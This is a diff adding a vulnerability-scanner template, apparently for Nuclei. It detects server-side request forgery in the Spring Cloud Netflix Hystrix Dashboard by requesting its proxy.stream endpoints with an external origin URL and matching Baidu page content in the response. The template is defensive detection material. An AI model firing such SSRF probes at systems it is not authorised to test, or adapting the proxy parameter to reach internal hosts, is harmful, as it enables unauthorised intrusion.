@@ -1,0 +1,24 @@
+id: spring-cloud-netflix-ssrf
+info:
+  name: Spring Cloud Netflix Hystrix Dashboard SSRF
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: ssrf
+  description: |
+    The template detects SSRF vulnerability in Spring Cloud Netflix Hystrix Dashboard by making requests to proxy endpoints and checking for expected Baidu content in the response.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/proxy.stream?origin=http://www.baidu.com"
+      - "{{BaseURL}}/api/proxy.stream?origin=http://www.baidu.com"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<title>百度一下，你就知道</title>"
+          - "src=//www.baidu.com/img/bd_logo1.png"
+        part: body
